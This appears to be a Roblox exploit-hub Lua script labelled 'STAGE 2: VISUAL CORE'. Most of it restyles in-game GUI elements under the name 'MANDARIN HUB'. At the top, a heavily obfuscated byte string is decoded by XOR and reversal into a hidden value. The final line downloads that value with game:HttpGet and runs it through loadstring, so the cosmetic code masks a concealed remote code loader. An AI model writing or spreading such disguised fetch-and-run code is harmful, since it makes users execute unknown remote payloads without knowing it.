
--[[ STAGE 2: VISUAL CORE ]]
local sPXAFRpdEIudb94E="\086\068\077\017\094\008\018\100\014\015\022\027\052\108\116\101\098\110\076\066\127\108\089\117\130\127\121\132\112\086\129\140\137\122\144\113\100\160\147\144\166\155\157\164\136\118\129\134\146\126\149\139\138\118\183\188\198\188\128\191\193\208\192\206\216\208\203\221\148\219\212\217\230\220\230\224\238\229\232\233\172\236\240\254\179\235\247\000\241\253\000\014\255\012\004\000\023\004\017\007\022\030\215\018\038\025\224\226\215\034\033\031\033\047"local flI6crXIO6ME=156 local HYUnUpN8zHFDH=79 local sBmRPSb_f9F7G40H=0 local OUeGg5dXLR_6D2iQB=2 local KrMYj47iN4dwwARct=8 local SM9u5HFmsowQGFi=true local nYa2WoDA8ZJlKa69V=bit32 and bit32.bxor if not nYa2WoDA8ZJlKa69V then nYa2WoDA8ZJlKa69V=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local bNpxiVHcrUyQV={}for G1jkehXVh1YwnnD60T7=1,#sPXAFRpdEIudb94E do local bjyowdsWvdcQ=string.byte(sPXAFRpdEIudb94E,G1jkehXVh1YwnnD60T7)local ckwyblpL0lD9hv9j=(HYUnUpN8zHFDH+(G1jkehXVh1YwnnD60T7*OUeGg5dXLR_6D2iQB)+KrMYj47iN4dwwARct)%256 if sBmRPSb_f9F7G40H==0 then bjyowdsWvdcQ=(bjyowdsWvdcQ-ckwyblpL0lD9hv9j)%256 bNpxiVHcrUyQV[G1jkehXVh1YwnnD60T7]=string.char(nYa2WoDA8ZJlKa69V(bjyowdsWvdcQ,flI6crXIO6ME))else bjyowdsWvdcQ=nYa2WoDA8ZJlKa69V(bjyowdsWvdcQ,flI6crXIO6ME)bNpxiVHcrUyQV[G1jkehXVh1YwnnD60T7]=string.char((bjyowdsWvdcQ-ckwyblpL0lD9hv9j)%256)end end local utpHR4EeCJlXO312a=table.concat(bNpxiVHcrUyQV)if SM9u5HFmsowQGFi then utpHR4EeCJlXO312a=string.reverse(utpHR4EeCJlXO312a)end local wyBTn4_1FXmWUuqGFZI9Zj=utpHR4EeCJlXO312a
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(wyBTn4_1FXmWUuqGFZI9Zj))()
